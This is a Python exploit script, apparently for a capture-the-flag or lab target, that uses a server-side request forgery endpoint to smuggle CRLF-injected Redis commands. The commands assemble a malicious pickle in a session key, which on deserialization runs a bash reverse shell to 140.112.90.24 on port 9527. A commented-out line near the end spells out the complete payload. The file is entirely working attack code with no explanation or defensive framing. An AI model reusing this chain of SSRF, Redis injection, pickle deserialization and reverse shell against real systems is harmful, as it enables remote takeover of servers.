# env = python 3.7.5
import urllib, requests, socket
import os
import pickle, redis

#-------------OK---------------#
url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00"%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'

print(url_post)
r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
print(r.status_code, r.text)
requests.get(r.text, verify=False)

#-------------OK---------------#
url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "bash -c"%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'

print(url_post)
r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
print(r.status_code, r.text)
requests.get(r.text, verify=False)
#-------------OK---------------#
url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" " 'bash -i"%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'

print(url_post)
r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
print(r.status_code, r.text)
requests.get(r.text, verify=False)
#-------------OK---------------#
url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" " >"%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'

print(url_post)
r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
print(r.status_code, r.text)
requests.get(r.text, verify=False)
#-------------OK---------------#
url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "%26/dev/tcp/140.112.90.24/9527" %0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'

print(url_post)
r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
print(r.status_code, r.text)
requests.get(r.text, verify=False)
#-------------OK---------------#
url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "0>%261\'q\x01\x85q\x02Rq\x03." %0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'

print(url_post)
r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
print(r.status_code, r.text)
requests.get(r.text, verify=False)
# url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:1726804f-bcf3-4101-9d2b-22365652097d" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c \'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1\'q\x01\x85q\x02Rq\x03."%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'

# url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:057a0c8f-f743-4b1b-88ef-838e76c07408" GGGGGGGGGGGGGGGG%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
